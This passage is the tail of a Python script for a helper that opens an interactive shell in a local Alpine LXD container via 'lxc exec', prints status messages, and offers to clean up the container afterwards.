        print(f"    {S.Y}└─{S.E} Type {S.R}'exit'{S.E} to close the shell")
        print()
        
        subprocess.run(["lxc", "exec", "alpine-container", "--", "/bin/sh"])
        
       
        print()
        print_step(S.INFO, S.B, "SHELL", "Shell session ended")
        cleanup = input(f"    {S.Y}Cleanup container? (y/n){S.E}: ").strip().lower()
        if cleanup == 'y':
            self.cleanup()
    
    
if __name__ == '__main__':
    try:
        LXD_Helper()
    except KeyboardInterrupt:
        print()
        print_step(S.WARNING, S.Y, "EXIT", "Script interrupted by user")
        sys.exit(0)